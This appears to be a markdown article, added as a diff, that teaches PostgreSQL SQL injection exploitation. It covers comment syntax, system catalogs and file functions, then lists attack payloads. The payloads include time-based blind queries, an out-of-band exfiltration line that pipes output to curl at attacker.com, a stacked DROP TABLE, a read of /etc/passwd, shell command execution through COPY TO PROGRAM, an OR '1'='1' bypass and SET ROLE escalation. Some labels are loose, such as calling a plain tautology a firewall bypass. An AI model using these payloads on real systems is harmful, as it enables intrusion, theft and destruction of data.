@@ -1,0 +1,165 @@
+---
+title: 'Exploiting PostgreSQL SQL Injections: Advanced Techniques'
+description: Learn advanced techniques for exploiting SQL injections in PostgreSQL,
+  including error-based, blind, and privilege escalation methods.
+keywords:
+- PostgreSQL
+- SQL Injection
+- error-based
+- blind injection
+- time-based
+- stacked query
+- file manipulation
+- command execution
+- privilege escalation
+---
+
+# PostgreSQL
+
+## Context
+
+This article focuses on teaching operational techniques for exploiting SQL Injection vulnerabilities specifically in PostgreSQL databases. It's designed for readers who are already familiar with SQL syntax, database schema, and authentication mechanisms. This content falls under the broader category of SQL Injection techniques.
+
+## Theory
+
+### SQL Comment Syntax in PostgreSQL
+
+PostgreSQL supports two main comment syntaxes. The double dash `--` allows for single-line comments, while the block comment syntax `/* */` is used for multi-line comments. Understanding this can help in crafting or obfuscating SQL Injection payloads.
+
+### Database Version Identification
+
+To identify the version of PostgreSQL in use, you can execute the `version()` function. This function returns the full version string of the database, which is crucial for tailoring specific exploits.
+
+### Current Database Functions
+
+Several functions can be used to retrieve the currently active database and user context:
+- `CURRENT_DATABASE()`: Returns the name of the active database.
+- `user`, `current_user`, `session_user`: These functions return the current, session, or logged-in user respectively.
+
+### User Identification Functions
+
+Identifying the user logged into the database can provide insights into roles and permissions. Functions like `user`, `current_user`, and `session_user` are valuable for extracting this information.
+
+### System Catalog Tables
+
+PostgreSQL utilizes a set of system catalog tables that store metadata about databases, users, roles, and more:
+- `pg_user`, `pg_roles`: Contain details about users and roles.
+- `pg_database`: Lists all databases in the cluster.
+- `pg_class`, `pg_tables`: Contain information about tables.
+
+### File and Directory Functions
+
+PostgreSQL has functions for accessing the filesystem:
+- `pg_read_file()`: Reads files from the server's file system.
+- `pg_ls_dir()`: Lists directory contents.
+
+### String Manipulation Functions
+
+Functions used for string manipulation can assist in constructing dynamic queries or extracting information:
+- `array_to_string()`, `string_agg()`: Useful for concatenating arrays or aggregating strings.
+
+### Role and Authorization Management
+
+Commands like `SET ROLE` and `SET SESSION AUTHORIZATION` are pivotal for managing roles and escalating privileges within a database session.
+
+### Information Schema Usage
+
+The `INFORMATION_SCHEMA` provides a structured way to access metadata about database objects, such as tables and columns, making it a fundamental tool for reconnaissance in SQL Injection attacks.
+
+## Practice
+
+### Error-Based SQL Injection
+
+Trigger an error on a PostgreSQL server to reveal database information:
+
+```bash
+SELECT 1/0; --
+```
+
+This command intentionally causes a division by zero error, which can spill valuable error messages and insight about the database configuration or version.
+
+### Blind SQL Injection
+
+Exploit a vulnerability using a time-based blind SQL injection technique:
+
+```bash
+SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;
+```
+
+This query uses conditional logic to cause a delay based on true/false conditions, enabling data extraction over multiple requests.
+
+### Time-Based SQL Injection
+
+Infer data from the database using response timing:
+
+```bash
+SELECT pg_sleep(5); --
+```
+
+Measure the server's response time to deduce the existence of certain values or data profiles.
+
+### Out-of-Band SQL Injection
+
+Use out-of-band methods to exfiltrate data:
+
+```bash
+COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com';
+```
+
+This allows sending database data, such as the version, to an external server controlled by the attacker.
+
+### Stacked Query Injection
+
+Execute multiple SQL commands in one request:
+
+```bash
+SELECT 1; DROP TABLE users; --
+```
+
+This payload demonstrates appending unauthorized SQL commands that could potentially delete critical tables.
+
+### File Manipulation via SQL Injection
+
+Read sensitive server files:
+
+```bash
+SELECT pg_read_file('/etc/passwd'); --
+```
+
+Retrieve contents from files, providing an avenue to gather sensitive server information or credentials.
+
+### Command Execution via SQL Injection
+
+Execute arbitrary system commands:
+
+```bash
+COPY (SELECT '') TO PROGRAM 'id';
+```
+
+This command uses the COPY statement in PostgreSQL to execute shell commands, such as obtaining the current user identity on the system.
+
+### WAF Bypass Techniques
+
+Craft queries to bypass Web Application Firewalls:
+
+```bash
+SELECT * FROM users WHERE name='admin' OR '1'='1'; --
+```
+
+Such queries are designed to circumvent filtering mechanisms by exploiting logical flaws in the check processes.
+
+### Privilege Escalation via SQL Injection
+
+Escalate database privileges:
+
+```bash
+SET ROLE superuser; --
+```
+
+Gain higher privilege levels within the database, potentially allowing further exploitation and access to more sensitive data.
+
+## Tools
+
+- **sqlmap**
+- **pgcli**
+- **psql**
